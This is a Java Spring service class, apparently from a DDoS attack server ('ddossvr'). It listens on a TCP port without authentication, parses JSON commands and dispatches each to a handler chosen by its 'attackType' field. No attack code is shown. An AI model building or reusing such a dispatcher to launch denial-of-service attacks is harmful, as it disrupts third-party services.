package com.ec.ddossvr.service;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.atomic.AtomicInteger;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.DisposableBean;
import org.springframework.beans.factory.InitializingBean;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Service;

import com.ec.common.ApplicationContext;
import com.ec.common.service.QueueExec;
import com.ec.common.util.StringUtil;
import com.ec.ddossvr.DdossvrApplication;
import com.ec.ddossvr.dao.CommandSettingDao;
import com.ec.ddossvr.model.Command;
import com.ec.ddossvr.queue.ServiceAccept;
import com.ec.ddossvr.queue.SocketAccept;
import com.fasterxml.jackson.annotation.JsonInclude.Include;
import com.fasterxml.jackson.databind.DeserializationFeature;
import com.fasterxml.jackson.databind.ObjectMapper;

@Service
public class SocketService implements InitializingBean, DisposableBean {

	private static final Logger LOGGER = LoggerFactory.getLogger(DdossvrApplication.class);
	private static final Map<String, AtomicInteger> IP_MAP = new HashMap<>();
	private static ServerSocket servsock;

	private static ObjectMapper mapper = new ObjectMapper();
	static {
		mapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, false);
		mapper.setSerializationInclusion(Include.NON_NULL);
	}

	@Autowired
	private CommandSettingDao commandSettingDao;

	@Autowired
	private SocketAccept socketAccept;
	@Autowired
	private ServiceAccept serviceAccept;

	@Value("${ddossvr.tcpSvrPort:55}")
	private Integer svrPort;

	@Override
	public void afterPropertiesSet() throws Exception {

		servsock = new ServerSocket(svrPort);
		
		serviceAccept.enqueue(new QueueExec<ServerSocket>(servsock) {

			@Override
			public void exec() throws IOException {
				while (true) {

					Socket sock=servsock.accept();
					socketAccept.enqueue(new QueueExec<Socket>(sock) {

						@Override
						public void exec() {
							try {

								BufferedReader reader = new BufferedReader(new InputStreamReader(getParam().getInputStream()));
								PrintWriter writer = new PrintWriter(getParam().getOutputStream());

								String getStr = reader.readLine();

								if (StringUtil.isNotEmpty(getStr)) {
									
									System.err.println(getParam());


									Command get = mapper.readValue(getStr, Command.class);

									System.err.println("get:" + get);

									String commandName = CommandService.class.getSimpleName() + get.getAttackType().toUpperCase();
									System.err.println("commandName:" + commandName);
									CommandService commandSvr = ApplicationContext.getBean(commandName, CommandService.class);
									System.err.println("commandSvr:" + commandSvr.getClass().getName());
									commandSvr.command(get, writer);

									
								}else{
									LOGGER.warn("Sock read nothing",sock);
								}
								 

							} catch (IOException e) {
								LOGGER.error(e.getMessage(), e);
							}finally {
								try {
									sock.close();
								} catch (IOException e) {
									e.printStackTrace();
									LOGGER.error(e.getMessage(),e);
								}
							}

						}
					});
				}
				
			}
			
		});
		

		
	}

	@Override
	public void destroy() throws Exception {
		servsock.close();
	}

}
